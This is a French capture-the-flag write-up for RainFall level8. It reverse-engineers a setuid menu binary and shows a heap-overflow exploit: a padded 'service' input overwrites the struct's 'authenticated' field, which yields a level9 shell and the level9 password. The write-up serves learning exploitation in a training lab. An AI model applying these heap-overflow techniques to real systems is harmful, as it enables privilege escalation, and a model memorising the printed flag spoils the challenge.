Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
/home/user/level8
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level8 :

```bash
$ ./level8
(nil), (nil)
da
(nil), (nil)
da da
(nil), (nil)
^C
$ ./level8 da
(nil), (nil)
^C
$ ./level8 da da
(nil), (nil)
^C
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=c81dd233-7ccb-4ab8-8074-27857c96eb14) et en extrait une version probable du code :

```c
struct user {
    int id;
    char login[28];
    int authenticated;
};

int *service;
struct user *user; 

int main() {
    while (1) {
        printf("%p, %p \n", user, service);

        char buffer[128];

        if (!(fgets(buffer, 128, stdin)))
            break;

        if (!(strncmp(buffer, "auth ", 5))) {
            user = malloc(4);
            user->id = 0;

            if (strlen(buffer + 5) <= 30)
                strcpy(user, buffer + 5);
        }

        if (!(strncmp(buffer, "reset", 5)))
            free(user);

        if (!(strncmp(buffer, "service", 6)))
            service = strdup(buffer + 7);

        if (!(strncmp(buffer, "login", 5))) {
            if (user->authenticated)
                system("/bin/sh");
            else
                fwrite("Password:\n", 1, 10, stdout);
        }
    }
    return 0;
}
```

Je note la présence de variables nommées '`auth`' et '`password`', ainsi que des strings litérale `"login"`, '`service`', etc..
Le binaire semble agir comme une sorte de menu dans lequel on peut modifier des informations en écrivant un choix.

Je vérifie cette hypothèse :

```bash
$ ./level8
(nil), (nil)
auth adam
0x804a008, (nil)
(waiting for input)
```

Ok, c'est donc bien un binaire qui agit comme une sorte de menu. J'analyse ses fonctions :

- `auth` semble déclarer un nouvel utilisateur.
- `reset` semble `free` (supprimer) cet utilisateur
- `service` semble stocker une valeur dans la variable globale `service`.
- `login` semble être la clé de ce level, il semble que `login` vérifie le password et, si il est bon, donne accès au shell.


Si mon interprétation est correcte, alors la vulnérabilité semble être ici :

```c
    if (!(strncmp(buffer, "auth ", 5))) {
        user = malloc(4);
        user->id = 0;

        if (strlen(buffer + 5) <= 30) 
            strcpy(user, buffer + 5);
    }
```

On observe que la structure `user` se voit attribué seulement 4 bytes. Or, la structure nécessiterait plus d'espace que 4 bytes.

Je tente d'obtenir plus d'information en utilisant `ltrace` et en appellant `auth ` :

```bash
$ ltrace ./level8
__libc_start_main(0x8048564, 1, 0xbffff804, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil)
)                                                           = 14
fgets(auth
"auth \n", 128, 0xb7fd1ac0)                                 = 0xbffff6e0
malloc(4)                                                   = 0x0804a008
strcpy(0x0804a008, "\n")                                    = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
)                                                           = 18
fgets(
```

Puis en appellant `service` :

```bash
fgets(service
"service\n", 128, 0xb7fd1ac0)                               = 0xbffff6e0
strdup("\n")                                                = 0x0804a018
printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
)                                                           = 22
fgets(
```

Je détermine que la taille de buffer login dans la structure `user` est de 28 (malgré la comparaison à <= 30 dans `auth`) en me basant sur le retour de `BinaryNinja` qui indique :

```c
if (*(auth + 0x20) == 0)
{
    var_a4 = stdout;
    fwrite("Password:\n", 1, 0xa, var_a4);
}
```

Ici, le binaire veut vérifier la valeur du troisième int de la structure en allant à l'adresse du début de celle-ci + 32 bytes, soit 4 pour l'int `id` puis 28 bytes pour le `login`.

Alors, le manque de byte alloué devient évident en regardant les adresses renvoyées par `ltrace` :

Au moment de `strcpy()`, la structure `user` pointe sur l'adresse : `0x0804a008` mais lorsqu'on attribue une valeur à la variable globale `service`, `ltrace` nous indique qu'on écrit à l'adresse `0x0804a018`... Ce qui est `0x10` bytes plus loin (16). 

Or, la structure `user` nécessiterait au moins 4 bytes pour son `id`, 28 pour son login, et enfin 4 bytes de plus pour le 'booléen' `authenticated` utilisé dans `login`.

La structure nécessiterait donc entre 4 + 28 + 4 = 36 bytes.

Si mes hypothèses sont correctes, alors, et puisque `authenticated` n'est jamais attribué nul part, puisque de toute manière écrasé par `service`, il me suffirait donc d'atteindre la variable `authenticated` et lui donner une valeur positive pour que le login fonctionne.

Je pourrais donner un payload infecté à `service`, qui est 16 bytes plus loin que le début de la structure `user`, et ajouter du padding jusqu'à que service écrive sur la valeur de notre structure `user`, a son paramètre `authenticated`.

Si je considère que l'`id` vaut 4 bytes, puis 28 bytes de `login`, puis 4 bytes pour `authenticated`, je peux en conclure qu'une fois les 16 bytes écrasés par `service`, je me trouve à (4 + 28) - 16 = 16 bytes restant pour le login, et je pourrais ensuite écrire sur `authenticated`.

Mon payload/exploit serait donc le suivant :

- Je m'`auth ` pour déclarer une structure user
- J'appelle `service` écrit 15 caractères de padding ce qui devrait donner une valeur booléenne valide à `authenticated` (j'espace service et les 15 caractère, donc le 17eime caractère devrait écrire sur `authenticated`, et ce sera le `\n`)
- J'appelle `login` et si j'obtiens le shell, alors ça signifie que j'ai bien ré-écris `authenticated`, sinon je retente avec 18 caractère de padding (cas de figure où le login faisait 30 bytes)

J'essaye mon exploit :

```bash
$ ./level8
(nil), (nil)
auth
(nil), (nil)
^C
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service ABCDEFGHIJKLMNOP (espace + 16 lettres de l'alphabet => P donnera sa valeur à user->authenticated)
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

C'est un succès !







